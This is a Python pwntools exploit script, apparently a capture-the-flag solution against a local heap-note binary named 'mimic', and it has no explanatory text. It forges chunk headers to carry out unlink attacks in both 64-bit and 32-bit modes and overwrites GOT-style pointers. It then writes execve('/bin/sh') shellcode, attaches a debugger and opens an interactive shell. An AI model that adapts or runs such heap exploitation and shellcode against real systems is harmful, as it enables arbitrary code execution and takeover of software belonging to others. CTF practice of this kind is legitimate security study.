from pwn import * 
#context.arch='amd64'
#context.terminal=['tmux','splitw','-h']
context.log_level='debug'
def cmd(c):
    p.sendlineafter(">> ",str(c))
def add(size):
    cmd(1)
    p.sendlineafter("?\n",str(size))
def free(idx):
    cmd(2)
    p.sendlineafter("?\n",str(idx))
def show(idx):
    cmd(3)
    p.sendlineafter("?\n",str(idx))
def edit(idx,c):
    cmd(4)
    p.sendlineafter("?\n",str(idx))
    p.sendafter("?\n",c)
#p=process("./mimic_note_64")
p=process("./mimic")
add(0x18)
add(0x18)
add(0x88)
add(0xf8)
add(0x18)
edit(2,p64(0)+p64(0x81)+p64(0x123020-0x18)+p64(0x123020-0x10)+'\x00'*0x60+p64(0x80))
free(3)
edit(2,p64(0xff)+p64(0x0000000000123100)+p64(0xff)+p64(0x000000000602018)+'/bin/sh\x00')

context.arch='amd64'

sh='''
xor rax,rax
mov al,0x3b
mov rdi,0x123028
xor rsi,rsi
xor rdx,rdx
syscall
'''
sh=asm(sh)
edit(1,sh)

add(0xf8)
add(0x84)
add(0xf8)
add(0x18)
edit(5,p32(0)+p32(0x81)+p32(0x123028-0xc)+p32(0x123028-0x8)+'\x00'*0x70+p32(0x80))
gdb.attach(p,'b *0x000000000400927')
free(6)
sh='''
xor eax,eax
mov al,0xb
mov ebx,0x123040
xor ecx,ecx
int 0x80
'''
context.arch='i386'
edit(5,'\x00'*0xc+p32(0x804a014)+p32(0XFF)+p32(0)*2+p32(0x123200)+p32(0xff)+'/bin/sh\x00')
edit(5,p32(0x123200))
edit(7,asm(sh))
#x64
edit(2,p64(0x123100)[:-1])
free(0)
p.interactive()
